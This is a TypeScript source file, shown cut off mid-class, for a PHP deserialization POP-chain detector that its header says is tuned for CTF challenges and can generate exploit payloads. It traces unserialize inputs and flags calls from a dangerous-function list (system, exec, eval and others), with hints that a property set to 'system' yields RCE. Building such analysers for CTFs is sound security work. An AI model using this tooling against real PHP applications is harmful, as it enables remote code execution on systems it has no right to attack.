/**
 * POP Chain Detector - 自动检测PHP反序列化POP链
 * 专门针对CTF场景优化，能够自动生成可用的exploit payload
 */

import * as phpParser from 'php-parser';

// 危险函数列表
const DANGEROUS_FUNCTIONS = [
    'eval', 'assert', 'preg_replace', 'create_function',
    'call_user_func', 'call_user_func_array', 'array_map', 'array_filter',
    'usort', 'uasort', 'uksort', 'array_walk', 'array_walk_recursive',
    'file_get_contents', 'file_put_contents', 'fopen', 'fwrite', 'fread',
    'include', 'include_once', 'require', 'require_once',
    'system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open',
    'file', 'readfile', 'copy', 'rename', 'unlink', 'mkdir', 'rmdir'
];

// 魔术方法及其触发条件
const MAGIC_METHODS: Record<string, string> = {
    '__construct': '对象创建时触发',
    '__destruct': '对象销毁时触发 (反序列化后自动)',
    '__wakeup': '反序列化时触发 (首先执行)',
    '__sleep': '序列化时触发',
    '__toString': '对象被当作字符串使用时触发',
    '__invoke': '对象被当作函数调用时触发 $obj()',
    '__call': '调用不存在的方法时触发',
    '__callStatic': '调用不存在的静态方法时触发',
    '__get': '访问不存在的属性时触发',
    '__set': '设置不存在的属性时触发',
    '__isset': 'isset()检查不存在的属性时触发',
    '__unset': 'unset()不存在的属性时触发',
    '__clone': '克隆对象时触发'
};

export interface PropertyUsage {
    name: string;
    type: 'read' | 'write' | 'call' | 'object_call' | 'dynamic_func';
    line: number;
    context: string;
    details?: {
        calledMethod?: string;      // 调用的方法名
        calledMethodProp?: string;  // 方法名来自哪个属性
        arguments?: string[];       // 参数列表
        argumentProps?: string[];   // 参数来自哪些属性
    };
}

export interface DangerousCall {
    functionName: string;
    line: number;
    arguments: string[];
    isDynamic: boolean;
    riskLevel: 'critical' | 'high' | 'medium' | 'low';
    description: string;
    pattern: string;  // 调用模式
}

export interface TriggerInfo {
    type: string;
    targetClass?: string;
    targetMethod?: string;
    line: number;
    description: string;
    propertyUsed?: string;  // 使用的属性
}

export interface POPGadget {
    className: string;
    methodName: string;
    startLine: number;
    endLine: number;
    properties: PropertyUsage[];
    dangerousCalls: DangerousCall[];
    triggers: TriggerInfo[];
    isMagic: boolean;
    codePattern: string;  // 代码模式描述
}

// 属性条件 - 用于检测 if($this->prop === value) 这种模式
export interface PropertyCondition {
    propertyName: string;
    operator: '===' | '==' | '!=' | '!==' | '>' | '<' | '>=' | '<=';
    targetValue: any;
    line: number;
    action: string;  // 满足条件时的操作描述
    isSensitive: boolean;  // 是否是敏感操作（如输出flag、执行命令等）
}

// __wakeup 重置信息
export interface WakeupReset {
    propertyName: string;
    resetValue: any;
    line: number;
}

export interface ChainStep {
    className: string;
    methodName: string;
    trigger: string;
    description: string;
    line: number;
    propertyName?: string;
    propertyValue?: string;
    reads: string[];
    writes: string[];
    calls: string[];
    operations: string[];
    codePattern?: string;
}

export interface PayloadProperty {
    name: string;
    value: string | PayloadObject;
    comment: string;
}

export interface PayloadObject {
    className: string;
    properties: PayloadProperty[];
}

export interface POPChainResult {
    entryClass: string;
    entryMethod: string;
    steps: ChainStep[];
    finalSink: string;
    riskLevel: 'critical' | 'high' | 'medium' | 'low';
    payload: string;
    description: string;
    exploitMethod: string;
    dataFlow: string;
    payloadObject?: PayloadObject;  // 结构化的payload对象
    paramName?: string;      // unserialize 的参数名 (如 'data')
    paramSource?: string;    // 参数来源 (如 '$_GET')
    vulnType?: 'pop_chain' | 'property_injection' | 'wakeup_bypass';  // 漏洞类型
    bypassWakeup?: boolean;  // 是否需要绕过 __wakeup
    useBase64?: boolean;     // 是否需要 base64 编码
}

export interface EntryPoint {
    className: string;
    methodName: string;
    line: number;
    type: 'wakeup' | 'destruct' | 'toString' | 'other';
}

interface ClassInfo {
    name: string;
    properties: PropertyInfo[];
    methods: MethodInfo[];
    extends?: string;
    implements: string[];
    startLine: number;
    endLine: number;
    node: any;
}

interface PropertyInfo {
    name: string;
    visibility: 'public' | 'protected' | 'private';
    defaultValue?: any;
    line: number;
}

interface MethodInfo {
    name: string;
    visibility: 'public' | 'protected' | 'private';
    parameters: string[];
    startLine: number;
    endLine: number;
    node: any;
    isMagic: boolean;
}

export class POPChainDetector {
    private parser: phpParser.Engine;
    private classMap: Map<string, ClassInfo> = new Map();
    private gadgetMap: Map<string, POPGadget> = new Map();
    private ast: any;
    private sourceCode: string = '';

    constructor() {
        this.parser = new phpParser.Engine({
            parser: {
                extractDoc: true,
                php7: true
            },
            ast: {
                withPositions: true,
                withSource: true
            }
        });
    }

    /**
     * 获取类的所有属性（包括继承的父类属性）
     */
    private getAllClassProperties(className: string): PropertyInfo[] {
        const props: PropertyInfo[] = [];
        const visited = new Set<string>();
        
        let currentClass = className;
        while (currentClass && !visited.has(currentClass)) {
            visited.add(currentClass);
            const classInfo = this.classMap.get(currentClass);
            if (classInfo) {
                // 添加当前类的属性（子类属性优先，所以用 unshift 添加父类属性）
                for (const prop of classInfo.properties) {
                    if (!props.some(p => p.name === prop.name)) {
                        props.push(prop);
                    }
                }
                currentClass = classInfo.extends || '';
            } else {
                break;
            }
        }
        
        return props;
    }
    // 存储检测到的 unserialize 参数信息
    private unserializeParam: { paramName?: string; paramSource?: string; useBase64?: boolean } = {};

    /**
     * 主入口 - 检测POP链
     */
    public findPOPChains(code: string): POPChainResult[] {
        this.sourceCode = code;
        
        try {
            this.ast = this.parser.parseCode(code, 'php');
        } catch (e) {
            console.error('PHP解析错误:', e);
            return [];
        }

        // 0. 检测 unserialize 调用参数
        this.detectUnserializeParams();

        // 1. 构建类映射
        this.buildClassMap();
        
        if (this.classMap.size === 0) {
            console.log('未找到任何类定义');
            return [];
        }

        console.log(`找到 ${this.classMap.size} 个类:`);
        for (const [name, info] of this.classMap) {
            console.log(`  - ${name}: ${info.methods.map(m => m.name).join(', ')}`);
        }

        // 2. 分析每个类的方法，找到所有 gadgets
        const gadgets = this.findAllGadgets();
        console.log(`找到 ${gadgets.length} 个Gadget`);

        // 3. 构建完整的攻击链（POP链）
        const chains = this.buildCompleteChains(gadgets);
        console.log(`构建了 ${chains.length} 条POP链`);

        // 4. 检测属性注入漏洞（不需要POP链，直接修改属性即可利用）
        const propertyInjections = this.findPropertyInjectionVulns(gadgets);
        console.log(`检测到 ${propertyInjections.length} 个属性注入漏洞`);

        return [...chains, ...propertyInjections];
    }

    /**
     * 检测 unserialize 调用的参数信息
     */
    private detectUnserializeParams(): void {
        this.unserializeParam = {};
        this.traverseForUnserialize(this.ast);
    }

    private traverseForUnserialize(node: any): void {
        if (!node) return;

        if (node.kind === 'call' && node.what) {
            const funcName = node.what.name || '';
            if (funcName === 'unserialize' && node.arguments && node.arguments.length > 0) {
                const extracted = this.extractParamSourceWithBase64(node.arguments[0]);
                if (extracted.paramName) {
                    this.unserializeParam = extracted;
                    console.log('检测到 unserialize 参数:', extracted);
                }
            }
        }

        // 遍历所有可能的子节点
        if (Array.isArray(node)) {
            node.forEach(child => this.traverseForUnserialize(child));
        } else if (typeof node === 'object') {
            // 遍历对象的所有属性
            for (const key of Object.keys(node)) {
                if (key === 'loc' || key === 'leadingComments' || key === 'trailingComments') continue;
                const child = node[key];
                if (child && typeof child === 'object') {
                    this.traverseForUnserialize(child);
                }
            }
        }
    }

    /**
     * 从 AST 节点提取参数来源信息（支持 base64 检测）
     */
    private extractParamSourceWithBase64(node: any): { paramName?: string; paramSource?: string; useBase64?: boolean } {
        if (!node) return {};
        
        // base64_decode($_GET['data']) 等包装函数
        if (node.kind === 'call' && node.what) {
            const funcName = node.what.name || '';
            if (funcName === 'base64_decode' && node.arguments && node.arguments.length > 0) {
                const inner = this.extractParamSource(node.arguments[0]);
                return { ...inner, useBase64: true };
            }
            // 其他包装函数
            if (node.arguments && node.arguments.length > 0) {
                return this.extractParamSourceWithBase64(node.arguments[0]);
            }
        }
        
        return this.extractParamSource(node);
    }

    /**
     * 从 AST 节点提取参数来源信息
     */
    private extractParamSource(node: any): { paramName?: string; paramSource?: string } {
        if (!node) return {};
        
        // $_GET['data'], $_POST['data'] 等
        if (node.kind === 'offsetlookup' && node.what) {
            const source = this.nodeToParamString(node.what);
            const offset = node.offset ? this.extractOffsetValue(node.offset) : undefined;
            if (source && ['$_GET', '$_POST', '$_REQUEST', '$_COOKIE'].includes(source)) {
                return {
                    paramName: offset,
                    paramSource: source
                };
            }
        }
        
        // 变量: $data = $_GET['data']; unserialize($data);
        if (node.kind === 'variable') {
            return { paramName: node.name, paramSource: 'variable' };
        }
        
        // base64_decode($_GET['data']) 等包装函数
        if (node.kind === 'call' && node.arguments && node.arguments.length > 0) {
            return this.extractParamSource(node.arguments[0]);
        }
        
        return {};
    }

    private nodeToParamString(node: any): string | undefined {
        if (!node) return undefined;
        if (node.kind === 'variable') return '$' + node.name;
        if (node.kind === 'identifier') return node.name;
        return undefined;
    }

    private extractOffsetValue(node: any): string | undefined {
        if (!node) return undefined;
        if (node.kind === 'string') return node.value;
        if (node.kind === 'identifier') return node.name;
        if (node.kind === 'variable') return node.name;
        return undefined;
    }

    /**
     * 构建类映射表
     */
    private buildClassMap(): void {
        this.classMap.clear();
        this.traverseForClasses(this.ast);
    }

    private traverseForClasses(node: any): void {
        if (!node) return;

        if (node.kind === 'class') {
            const classInfo = this.extractClassInfo(node);
            this.classMap.set(classInfo.name, classInfo);
        }

        if (Array.isArray(node)) {
            node.forEach(child => this.traverseForClasses(child));
        } else if (node.children) {
            node.children.forEach((child: any) => this.traverseForClasses(child));
        } else if (node.body) {
            if (Array.isArray(node.body)) {
                node.body.forEach((child: any) => this.traverseForClasses(child));
            } else {
                this.traverseForClasses(node.body);
            }
        }
    }

    private extractClassInfo(node: any): ClassInfo {
        const info: ClassInfo = {
            name: node.name?.name || node.name || 'Unknown',
            properties: [],
            methods: [],
            implements: [],
            startLine: node.loc?.start?.line || 1,
            endLine: node.loc?.end?.line || 1,
            node: node
        };

        if (node.extends) {
            info.extends = node.extends.name || node.extends;
        }

        const body = node.body || [];
        for (const member of body) {
            if (member.kind === 'propertystatement') {
                for (const prop of (member.properties || [])) {
                    info.properties.push({
                        name: prop.name?.name || prop.name || 'unknown',
                        visibility: member.visibility || 'public',
                        defaultValue: this.extractValue(prop.value),
                        line: member.loc?.start?.line || 1
                    });
                }
            } else if (member.kind === 'method') {
                const methodName = member.name?.name || member.name || 'unknown';
                info.methods.push({
                    name: methodName,
                    visibility: member.visibility || 'public',
                    parameters: this.extractParameters(member.arguments || []),
                    startLine: member.loc?.start?.line || 1,
                    endLine: member.loc?.end?.line || 1,
                    node: member,
                    isMagic: methodName.startsWith('__')
                });
            }
        }

        return info;
    }

    private extractParameters(args: any[]): string[] {
        return args.map(arg => arg.name?.name || arg.name || 'unknown');
    }

    private extractValue(node: any): any {
        if (!node) return undefined;
        if (node.kind === 'string') return node.value;
        if (node.kind === 'number') return node.value;
        if (node.kind === 'boolean') return node.value;
        if (node.kind === 'nullkeyword') return null;
        return undefined;
    }

    /**
     * 找到所有可用的Gadget
     */
    private findAllGadgets(): POPGadget[] {
        const gadgets: POPGadget[] = [];

        for (const [className, classInfo] of this.classMap) {
            for (const method of classInfo.methods) {
                const gadget = this.analyzeMethod(className, method, classInfo);
                if (gadget) {
                    gadgets.push(gadget);
                    this.gadgetMap.set(`${className}::${method.name}`, gadget);
                    console.log(`  Gadget: ${className}::${method.name}`);
                    if (gadget.dangerousCalls.length > 0) {
                        console.log(`    危险调用: ${gadget.dangerousCalls.map(d => d.pattern).join(', ')}`);
                    }
                    if (gadget.triggers.length > 0) {
                        console.log(`    触发器: ${gadget.triggers.map(t => t.type).join(', ')}`);
                    }
                }
            }
        }

        return gadgets;
    }

    /**
     * 分析单个方法
     */
    private analyzeMethod(className: string, method: MethodInfo, classInfo: ClassInfo): POPGadget | null {
        const gadget: POPGadget = {
            className,
            methodName: method.name,
            startLine: method.startLine,
            endLine: method.endLine,
            properties: [],
            dangerousCalls: [],
            triggers: [],
            isMagic: method.isMagic,
            codePattern: ''
        };

        // 变量追踪: 局部变量 -> 它来自的属性
        // 例如: $id = $this->id  =>  varToProperty["id"] = "id"
        const varToProperty: Map<string, string> = new Map();
        
        // 第一遍：收集变量赋值
        this.collectVariableAssignments(method.node.body, varToProperty);
        
        // 第二遍：分析方法体，使用变量映射
        this.analyzeNodeWithVarTracking(method.node.body, gadget, classInfo, method.parameters, varToProperty);

        // 只返回有意义的 gadget
        if (gadget.dangerousCalls.length > 0 || gadget.triggers.length > 0 || 
            (gadget.isMagic && gadget.properties.length > 0)) {
            return gadget;
        }

        return null;
    }

    /**
     * 收集变量赋值: $var = $this->prop
     */
    private collectVariableAssignments(node: any, varToProperty: Map<string, string>): void {
        if (!node) return;

        if (node.kind === 'assign' || node.kind === 'expressionstatement') {
            const assignNode = node.kind === 'expressionstatement' ? node.expression : node;
            if (assignNode?.kind === 'assign') {
                const left = assignNode.left;
                const right = assignNode.right;
                
                // $var = $this->prop
                if (left?.kind === 'variable' && this.isThisProperty(right)) {
                    const varName = left.name;
                    const propName = this.getPropertyFromNode(right);
                    varToProperty.set(varName, propName);
                }
            }
        }

        // 递归
        this.traverseChildren(node, child => this.collectVariableAssignments(child, varToProperty));
    }

    /**
     * 递归分析AST节点 (带变量追踪)
     */
    private analyzeNodeWithVarTracking(node: any, gadget: POPGadget, classInfo: ClassInfo, params: string[], varToProperty: Map<string, string>): void {
        if (!node) return;

        const line = node.loc?.start?.line || 0;

        // 0. 检测所有 $this->prop 属性读取
        if (node.kind === 'propertylookup' && this.isThisProperty(node)) {
            const propName = this.getPropertyFromNode(node);
            if (!gadget.properties.some(p => p.name === propName)) {
                gadget.properties.push({
                    name: propName,
                    type: 'read',
                    line,
                    context: `读取属性 $this->${propName}`
                });
            }
        }

        // 1. 检测函数/方法调用
        if (node.kind === 'call') {
            this.analyzeCallExpressionWithVarTracking(node, gadget, classInfo, line, params, varToProperty);
        }

        // 2. 检测字符串拼接（触发__toString）
        if (node.kind === 'bin' && node.type === '.') {
            this.analyzeStringConcat(node, gadget, line);
        }

        // 3. 检测echo/print（触发__toString）
        if (node.kind === 'echo' || node.kind === 'print') {
            this.analyzeEchoPrint(node, gadget, line);
        }

        // 4. 检测属性赋值（触发__set）
        if (node.kind === 'assign') {
            this.analyzeAssignment(node, gadget, line);
        }

        // 递归遍历子节点
        this.traverseChildren(node, child => this.analyzeNodeWithVarTracking(child, gadget, classInfo, params, varToProperty));
    }
    
    /**
     * 递归分析AST节点
     */
    private analyzeNode(node: any, gadget: POPGadget, classInfo: ClassInfo, params: string[]): void {
        this.analyzeNodeWithVarTracking(node, gadget, classInfo, params, new Map());
    }

    private traverseChildren(node: any, callback: (child: any) => void): void {
        if (Array.isArray(node)) {
            node.forEach(child => callback(child));
        } else if (typeof node === 'object' && node !== null) {
            for (const key of Object.keys(node)) {
                if (key === 'loc' || key === 'kind') continue;
                const child = node[key];
                if (child && typeof child === 'object') {
                    callback(child);
                }
            }
        }
    }

    /**
     * 分析函数调用表达式 - 核心逻辑
     */
    private analyzeCallExpression(node: any, gadget: POPGadget, classInfo: ClassInfo, line: number, params: string[]): void {
        const what = node.what;
        const args = node.arguments || [];

        // === 模式1: 直接危险函数调用 system($arg) ===
        if (what?.kind === 'identifier' || what?.kind === 'name') {
            const funcName = what.name || what;
            if (typeof funcName === 'string' && DANGEROUS_FUNCTIONS.includes(funcName.toLowerCase())) {
                const argStrs = this.extractArgStrings(args);
                gadget.dangerousCalls.push({
                    functionName: funcName,
                    line,
                    arguments: argStrs,
                    isDynamic: false,
                    riskLevel: this.getRiskLevel(funcName),
                    description: `直接调用危险函数 ${funcName}(${argStrs.join(', ')})`,
                    pattern: `${funcName}(${argStrs.join(', ')})`
                });
            }
        }

        // === 模式2: ($this->prop)($arg) - 动态函数调用 ===
        // 例如: ($this->name)($age) 其中 name="system", age="whoami"
        if (this.isThisPropertyCall(what)) {
            const propName = this.getPropertyFromNode(what);
            const argStrs = this.extractArgStrings(args);
            const argProps = this.extractArgProperties(args);
            
            gadget.properties.push({
                name: propName,
                type: 'dynamic_func',
                line,
                context: `动态函数调用: ($this->${propName})(...)`,
                details: {
                    arguments: argStrs,
                    argumentProps: argProps
                }
            });

            gadget.dangerousCalls.push({
                functionName: `($this->${propName})`,
                line,
                arguments: argStrs,
                isDynamic: true,
                riskLevel: 'critical',
                description: `动态函数调用: 设置 $this->${propName}="system" 可实现RCE`,
                pattern: `($this->${propName})(${argStrs.join(', ')})`
            });

            // 也可能触发 __invoke
            gadget.triggers.push({
                type: '__invoke',
                line,
                description: `如果 $this->${propName} 是对象，将触发 __invoke`,
                propertyUsed: propName
            });
        }

        // === 模式3: $var($arg) - 变量函数调用 ===
        // 例如: $name($this) 其中 $name 可能来自 $this->id
        if (what?.kind === 'variable' && what.name !== 'this') {
            const varName = what.name;
            const argStrs = this.extractArgStrings(args);
            
            gadget.dangerousCalls.push({
                functionName: `$${varName}`,
                line,
                arguments: argStrs,
                isDynamic: true,
                riskLevel: 'high',
                description: `变量函数调用: $${varName}(${argStrs.join(', ')})`,
                pattern: `$${varName}(${argStrs.join(', ')})`
            });

            // 触发 __invoke
            gadget.triggers.push({
                type: '__invoke',
                line,
                description: `$${varName}() 如果是对象将触发 __invoke`
            });
        }

        // === 模式4: ($this->obj)->method($arg) - 对象方法调用 ===
        // 例如: ($this->name)->$id($this->age)
        if (what?.kind === 'propertylookup') {
            const result = this.analyzePropertyLookupCall(what, args, line);
            if (result) {
                gadget.properties.push(...result.properties);
                gadget.dangerousCalls.push(...result.dangerousCalls);
                gadget.triggers.push(...result.triggers);
            }
        }

        // === 模式5: 对象方法调用检测可利用的普通方法 ===
        if (what?.kind === 'propertylookup') {
            const objPart = what.what;
            const methodPart = what.offset;
            
            // $this->method() - 调用自己的方法
            if (objPart?.kind === 'variable' && objPart.name === 'this') {
                if (methodPart?.kind === 'identifier') {
                    const methodName = methodPart.name;
                    // 检查这个类是否有这个方法
                    const hasMethod = classInfo.methods.some(m => m.name === methodName);
                    if (hasMethod) {
                        gadget.triggers.push({
                            type: 'method_call',
                            targetMethod: methodName,
                            line,
                            description: `调用 $this->${methodName}()`
                        });
                    }
                }
            }
        }
    }

    /**
     * 分析函数调用表达式 - 带变量追踪
     * 核心改进：追踪 $id = $this->id 这样的赋值，然后解析 ->$id() 调用
     */
    private analyzeCallExpressionWithVarTracking(node: any, gadget: POPGadget, classInfo: ClassInfo, line: number, params: string[], varToProperty: Map<string, string>): void {
        const what = node.what;
        const args = node.arguments || [];

        // === 模式1: 直接危险函数调用 system($arg) ===
        if (what?.kind === 'identifier' || what?.kind === 'name') {
            const funcName = what.name || what;
            if (typeof funcName === 'string' && DANGEROUS_FUNCTIONS.includes(funcName.toLowerCase())) {
                const argStrs = this.extractArgStrings(args);
                gadget.dangerousCalls.push({
                    functionName: funcName,
                    line,
                    arguments: argStrs,
                    isDynamic: false,
                    riskLevel: this.getRiskLevel(funcName),
                    description: `直接调用危险函数 ${funcName}(${argStrs.join(', ')})`,
                    pattern: `${funcName}(${argStrs.join(', ')})`
                });
            }
        }

        // === 模式2: ($this->prop)($arg) - 动态函数调用 ===
        if (this.isThisPropertyCall(what)) {
            const propName = this.getPropertyFromNode(what);
            const argStrs = this.extractArgStrings(args);
            const argProps = this.extractArgProperties(args);
            
            gadget.properties.push({
                name: propName,
                type: 'dynamic_func',
                line,
                context: `动态函数调用: ($this->${propName})(...)`,
                details: {
                    arguments: argStrs,
                    argumentProps: argProps
                }
            });

            gadget.dangerousCalls.push({
                functionName: `($this->${propName})`,
                line,
                arguments: argStrs,
                isDynamic: true,
                riskLevel: 'critical',
                description: `动态函数调用: 设置 $this->${propName}="system" 可实现RCE`,
                pattern: `($this->${propName})(${argStrs.join(', ')})`
            });

            gadget.triggers.push({
                type: '__invoke',
                line,
                description: `如果 $this->${propName} 是对象，将触发 __invoke`,
                propertyUsed: propName
            });
        }

        // === 模式3: $var($arg) - 变量函数调用 ===
        if (what?.kind === 'variable' && what.name !== 'this') {
            const varName = what.name;
            const argStrs = this.extractArgStrings(args);
            
            // 检查变量是否来自 $this->prop
            const mappedProp = varToProperty.get(varName);
            if (mappedProp) {
                // 这个变量来自 $this->prop，所以这实际上是动态函数调用
                gadget.properties.push({
                    name: mappedProp,
                    type: 'dynamic_func',
                    line,
                    context: `动态函数调用: $${varName} 来自 $this->${mappedProp}`,
                    details: {
                        arguments: argStrs,
                        argumentProps: this.extractArgProperties(args)
                    }
                });
            }
            
            gadget.dangerousCalls.push({
                functionName: mappedProp ? `$${varName} (=$this->${mappedProp})` : `$${varName}`,
                line,
                arguments: argStrs,
                isDynamic: true,
                riskLevel: 'high',
                description: mappedProp 
                    ? `变量函数调用: $${varName} 来自 $this->${mappedProp}` 
                    : `变量函数调用: $${varName}(${argStrs.join(', ')})`,
                pattern: `$${varName}(${argStrs.join(', ')})`
            });

            gadget.triggers.push({
                type: '__invoke',
                line,
                description: `$${varName}() 如果是对象将触发 __invoke`
            });
        }

        // === 模式4: ($this->obj)->$var($arg) - 对象动态方法调用 ===
        // 关键改进：追踪 $var 来自哪个属性
        if (what?.kind === 'propertylookup') {
            const result = this.analyzePropertyLookupCallWithVarTracking(what, args, line, varToProperty);
            if (result) {
                gadget.properties.push(...result.properties);
                gadget.dangerousCalls.push(...result.dangerousCalls);
                gadget.triggers.push(...result.triggers);
            }
        }

        // === 模式5: 对象方法调用检测可利用的普通方法 ===
        if (what?.kind === 'propertylookup') {
            const objPart = what.what;
            const methodPart = what.offset;
            
            if (objPart?.kind === 'variable' && objPart.name === 'this') {
                if (methodPart?.kind === 'identifier') {
                    const methodName = methodPart.name;
                    const hasMethod = classInfo.methods.some(m => m.name === methodName);
                    if (hasMethod) {
                        gadget.triggers.push({
                            type: 'method_call',
                            targetMethod: methodName,
                            line,
                            description: `调用 $this->${methodName}()`
                        });
                    }
                }
            }
        }
    }

    /**
     * 分析 propertylookup 调用模式 (带变量追踪)
     */
    private analyzePropertyLookupCallWithVarTracking(what: any, args: any[], line: number, varToProperty: Map<string, string>): {
        properties: PropertyUsage[];
        dangerousCalls: DangerousCall[];
        triggers: TriggerInfo[];
    } | null {
        const result = {
            properties: [] as PropertyUsage[],
            dangerousCalls: [] as DangerousCall[],
            triggers: [] as TriggerInfo[]
        };

        const objPart = what.what;  // 被调用的对象
        const methodPart = what.offset;  // 方法名

        // 检查是否是 ($this->prop)->method() 或 ($this->prop)->$var() 模式
        if (objPart?.kind === 'propertylookup' || 
            (objPart?.kind === 'parenthesis' && objPart.inner?.kind === 'propertylookup')) {
            
            const innerProp = objPart.kind === 'parenthesis' ? objPart.inner : objPart;
            
            if (this.isThisProperty(innerProp)) {
                const objPropName = this.getPropertyFromNode(innerProp);
                const argStrs = this.extractArgStrings(args);
                const argProps = this.extractArgProperties(args);

                // 动态方法名: ($this->obj)->$methodVar($arg)
                if (methodPart?.kind === 'variable') {
                    const methodVarName = methodPart.name;
                    
                    // 关键：检查这个变量是否来自某个属性
                    const methodPropName = varToProperty.get(methodVarName);
                    const actualMethodProp = methodPropName || methodVarName;
                    
                    result.properties.push({
                        name: objPropName,
                        type: 'object_call',
                        line,
                        context: methodPropName 
                            ? `对象方法调用: ($this->${objPropName})->$${methodVarName}(...) 其中 $${methodVarName}=$this->${methodPropName}`
                            : `对象方法调用: ($this->${objPropName})->$${methodVarName}(...)`,
                        details: {
                            calledMethodProp: actualMethodProp,  // 使用追踪到的属性名
                            arguments: argStrs,
                            argumentProps: argProps
                        }
                    });

                    result.dangerousCalls.push({
                        functionName: `($this->${objPropName})->$${methodVarName}`,
                        line,
                        arguments: argStrs,
                        isDynamic: true,
                        riskLevel: 'critical',
                        description: methodPropName
                            ? `动态对象方法调用: $this->${objPropName}=对象, $this->${methodPropName}=方法名`
                            : `动态对象方法调用: $this->${objPropName}=对象, $${methodVarName}=方法名`,
                        pattern: `($this->${objPropName})->$${methodVarName}(${argStrs.join(', ')})`
                    });

                    result.triggers.push({
                        type: '__call',
                        line,
                        description: `可能触发 __call 如果方法不存在`,
                        propertyUsed: objPropName
                    });
                }
                // 静态方法名: ($this->obj)->methodName($arg)
                else if (methodPart?.kind === 'identifier') {
                    const methodName = methodPart.name;
                    
                    result.properties.push({
                        name: objPropName,
                        type: 'object_call',
                        line,
                        context: `对象方法调用: ($this->${objPropName})->${methodName}(...)`,
                        details: {
                            calledMethod: methodName,
                            arguments: argStrs,
                            argumentProps: argProps
                        }
                    });

                    result.triggers.push({
                        type: 'object_method',
                        targetMethod: methodName,
                        line,
                        description: `通过 $this->${objPropName} 调用 ${methodName}()`,
                        propertyUsed: objPropName
                    });
                }
            }
        }

        return result.properties.length > 0 || result.dangerousCalls.length > 0 ? result : null;
    }

    /**
     * 分析 propertylookup 调用模式 (原始版本)
     */
    private analyzePropertyLookupCall(what: any, args: any[], line: number): {
        properties: PropertyUsage[];
        dangerousCalls: DangerousCall[];

        triggers: TriggerInfo[];
    } | null {
        const result = {
            properties: [] as PropertyUsage[],
            dangerousCalls: [] as DangerousCall[],
            triggers: [] as TriggerInfo[]
        };

        const objPart = what.what;  // 被调用的对象
        const methodPart = what.offset;  // 方法名

        // 检查是否是 ($this->prop)->method() 或 ($this->prop)->$var() 模式
        if (objPart?.kind === 'propertylookup' || 
            (objPart?.kind === 'parenthesis' && objPart.inner?.kind === 'propertylookup')) {
            
            const innerProp = objPart.kind === 'parenthesis' ? objPart.inner : objPart;
            
            if (this.isThisProperty(innerProp)) {
                const objPropName = this.getPropertyFromNode(innerProp);
                const argStrs = this.extractArgStrings(args);
                const argProps = this.extractArgProperties(args);

                // 动态方法名: ($this->obj)->$methodVar($arg)
                if (methodPart?.kind === 'variable') {
                    const methodVarName = methodPart.name;
                    
                    result.properties.push({
                        name: objPropName,
                        type: 'object_call',
                        line,
                        context: `对象方法调用: ($this->${objPropName})->$${methodVarName}(...)`,
                        details: {
                            calledMethodProp: methodVarName,
                            arguments: argStrs,
                            argumentProps: argProps
                        }
                    });

                    result.dangerousCalls.push({
                        functionName: `($this->${objPropName})->$${methodVarName}`,
                        line,
                        arguments: argStrs,
                        isDynamic: true,
                        riskLevel: 'critical',
                        description: `动态对象方法调用: $this->${objPropName}=对象, $${methodVarName}=方法名`,
                        pattern: `($this->${objPropName})->$${methodVarName}(${argStrs.join(', ')})`
                    });

                    result.triggers.push({
                        type: '__call',
                        line,
                        description: `可能触发 __call 如果方法不存在`,
                        propertyUsed: objPropName
                    });
                }
                // 静态方法名: ($this->obj)->methodName($arg)
                else if (methodPart?.kind === 'identifier') {
                    const methodName = methodPart.name;
                    
                    result.properties.push({
                        name: objPropName,
                        type: 'object_call',
                        line,
                        context: `对象方法调用: ($this->${objPropName})->${methodName}(...)`,
                        details: {
                            calledMethod: methodName,
                            arguments: argStrs,
                            argumentProps: argProps
                        }
                    });

                    result.triggers.push({
                        type: 'object_method',
                        targetMethod: methodName,
                        line,
                        description: `通过 $this->${objPropName} 调用 ${methodName}()`,
                        propertyUsed: objPropName
                    });
                }
            }
        }

        return result.properties.length > 0 || result.dangerousCalls.length > 0 ? result : null;
    }

    /**
     * 分析字符串拼接
     */
    private analyzeStringConcat(node: any, gadget: POPGadget, line: number): void {
        const checkSide = (side: any) => {
            if (this.isThisProperty(side)) {
                const propName = this.getPropertyFromNode(side);
                gadget.triggers.push({
                    type: '__toString',
                    line,
                    description: `字符串拼接: $this->${propName} 如果是对象将触发 __toString`,
                    propertyUsed: propName
                });
            }
        };
        checkSide(node.left);
        checkSide(node.right);
    }

    /**
     * 分析 echo/print
     */
    private analyzeEchoPrint(node: any, gadget: POPGadget, line: number): void {
        const expressions = node.arguments || node.expression || [];
        const exprs = Array.isArray(expressions) ? expressions : [expressions];

        for (const expr of exprs) {
            if (this.isThisProperty(expr)) {
                const propName = this.getPropertyFromNode(expr);
                gadget.triggers.push({
                    type: '__toString',
                    line,
                    description: `echo/print: $this->${propName} 如果是对象将触发 __toString`,
                    propertyUsed: propName
                });
            }
        }
    }

    /**
     * 分析赋值操作
     */
    private analyzeAssignment(node: any, gadget: POPGadget, line: number): void {
        const left = node.left;
        const right = node.right;

        // $obj->prop = $value 可能触发 __set
        if (left?.kind === 'propertylookup') {
            const obj = left.what;
            // 如果对象是 $this->xxx，可能触发目标对象的 __set
            if (obj?.kind === 'propertylookup' && this.isThisProperty(obj)) {
                const objPropName = this.getPropertyFromNode(obj);
                const targetProp = this.getPropertyFromNode(left);
                
                gadget.triggers.push({
                    type: '__set',
                    line,
                    description: `属性赋值: ($this->${objPropName})->${targetProp} = ... 可能触发 __set`,
                    propertyUsed: objPropName
                });
            }
        }
    }

    // === 辅助函数 ===

    private isThisProperty(node: any): boolean {
        if (!node) return false;
        if (node.kind === 'parenthesis') {
            return this.isThisProperty(node.inner);
        }
        if (node.kind !== 'propertylookup') return false;
        const what = node.what;
        return what?.kind === 'variable' && what?.name === 'this';
    }

    /**
     * 检测是否是动态函数调用: ($this->prop)() 或真正的属性函数调用
     * 注意：$this->method() 不是动态调用（method是静态标识符）
     */
    private isThisPropertyCall(node: any): boolean {
        if (!node) return false;
        
        // ($this->prop)() - 包裹在括号中，这是动态函数调用
        if (node.kind === 'parenthesis') {
            return this.isThisProperty(node.inner);
        }
        
        // $this->prop 直接作为函数调用
        // 关键区分：检查 offset 是 identifier（静态方法名）还是 variable（动态）
        if (node.kind === 'propertylookup') {
            const what = node.what;
            const offset = node.offset;
            
            // 必须是 $this
            if (what?.kind !== 'variable' || what?.name !== 'this') {
                return false;
            }
            
            // 如果 offset 是 identifier，这是静态方法调用 $this->method()，不是动态
            // 如果 offset 是 variable，这是动态方法调用 $this->$method()
            if (offset?.kind === 'identifier') {
                return false;  // $this->method() - 不是动态函数调用
            }
            
            // $this->$prop() 或其他动态情况
            return true;
        }
        
        return false;
    }

